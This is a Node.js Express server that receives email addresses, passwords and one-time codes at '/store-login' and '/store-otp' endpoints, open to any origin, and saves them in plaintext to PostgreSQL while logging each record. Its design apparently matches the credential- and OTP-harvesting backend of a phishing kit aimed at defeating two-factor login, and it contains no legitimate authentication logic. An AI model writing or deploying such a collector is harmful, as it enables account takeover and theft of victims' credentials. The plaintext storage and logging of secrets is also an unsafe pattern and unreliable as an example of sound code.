require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// PostgreSQL pool
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Create tables if they don't exist
const createTables = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS logins (
        id SERIAL PRIMARY KEY,
        email TEXT NOT NULL,
        pass TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS otps (
        id SERIAL PRIMARY KEY,
        email TEXT NOT NULL,
        otp TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    console.log("Tables are ready ✅");
  } catch (err) {
    console.error("Error creating tables:", err);
    process.exit(1);
  }
};

// Routes
app.post("/store-login", async (req, res) => {
  const { email, pass } = req.body;
  if (!email || !pass) return res.status(400).json({ error: "Missing fields" });

  try {
    const result = await pool.query("INSERT INTO logins (email, pass) VALUES ($1, $2) RETURNING *", [email, pass]);
    console.log("Saved login:", result.rows[0]);
    res.json({ success: true });
  } catch (err) {
    console.error("DB error:", err);
    res.status(500).json({ error: "Database error" });
  }
});

app.post("/store-otp", async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) return res.status(400).json({ error: "Missing fields" });

  try {
    const result = await pool.query("INSERT INTO otps (email, otp) VALUES ($1, $2) RETURNING *", [email, otp]);
    console.log("Saved OTP:", result.rows[0]);
    res.json({ success: true });
  } catch (err) {
    console.error("DB error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// Start server after tables are ready
const startServer = async () => {
  await createTables();
  app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
};

startServer();
